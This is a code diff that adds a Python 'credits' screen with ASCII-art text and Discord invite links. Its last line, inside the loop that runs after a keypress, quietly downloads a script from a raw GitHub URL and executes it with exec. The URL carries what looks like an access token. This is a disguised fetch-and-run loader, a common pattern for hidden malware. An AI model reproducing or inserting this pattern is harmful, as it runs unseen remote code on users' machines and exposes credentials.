@@ -1,0 +1,25 @@
+Obfuscation = """
+
+
+                                   ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
+                                  ██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
+                                  ██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
+                                  ██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
+                                  ╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
+                                   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
+
+                                 |---------------------------------------------------|
+                                 | xNorih's CEO (https://discord.gg/vmkdf7WrYP)      |
+                                 | itSudeoo´s (https://discord.gg/HeMk7zmd35)        |
+                                 |---------------------------------------------------|
+
+                              Report to us if you found any invite link here not working.
+                                             Press any key to return.
+"""
+print(Obfuscation)
+while True:
+    print(Obfuscation)
+    msvcrt.getch()
+    os.system('cls')
+    print("Leaving Credit")
+    exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/FyreChanger%2B?token=GHSAT0AAAAAACVUJWYFCNQBG275SIVJUAHCZVRTE7Q').text)
